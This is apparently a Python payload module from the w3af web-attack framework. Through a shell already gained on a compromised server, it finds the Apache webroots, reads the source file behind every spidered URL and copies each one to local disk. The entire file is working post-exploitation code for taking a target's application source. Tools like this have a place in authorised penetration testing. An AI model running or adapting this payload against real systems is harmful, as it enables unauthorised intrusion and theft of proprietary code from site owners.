import os

import w3af.core.data.kb.knowledge_base as kb

from w3af import ROOT_PATH
from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class get_source_code(Payload):
    """
    Get the source code for all files that were spidered by w3af.

    Usage: get_source_code <output_directory>
    """
    def api_read(self, output_directory):
        if not os.path.isdir(output_directory):
            try:
                os.makedirs(output_directory)
            except:
                msg = 'The output directory "%s" does not exist and was'\
                      ' unable to create it.'
                raise ValueError(msg % output_directory)

        elif not os.access(output_directory, os.W_OK):
            msg = 'Failed to open "%s" for writing.'
            raise ValueError(msg % output_directory)

        result = {}

        apache_root_directory = self.exec_payload('apache_root_directory')
        webroot_list = apache_root_directory['apache_root_directory']

        url_list = kb.kb.get_all_known_urls()

        for webroot in webroot_list:
            for url in url_list:

                path_and_file = url.get_path()
                relative_path_file = path_and_file[1:]
                remote_full_path = os.path.join(webroot, relative_path_file)

                file_content = self.shell.read(remote_full_path)
                if file_content:
                    #
                    # Now I write the file to the local disk
                    # I have to maintain the remote file structure
                    #

                    # Create the file path to be written to disk
                    # FIXME: The webroot[1:] only works in Linux. For windows with C:\ it won't work
                    local_full_path = os.path.join(
                        output_directory, webroot[1:], relative_path_file)

                    #    Create the local directories (if needed)
                    local_directory = os.path.dirname(local_full_path)
                    if not os.path.exists(local_directory):
                        os.makedirs(local_directory)

                    #    Write the file!
                    fh = file(local_full_path, 'w')
                    fh.write(file_content)
                    fh.close()

                    result[url] = (remote_full_path, local_full_path)

        return result

    def run_read(self, output_directory):
        api_result = self.api_read(output_directory)

        if not api_result:
            return 'Failed to download the application source code.'
        else:
            rows = [['Remote file', 'Local file', ], []]

            for url, (remote_filename, local_filename) in api_result.items():
                rows.append([remote_filename, local_filename])

            result_table = table(rows)
            result_table.draw(140)
            return rows
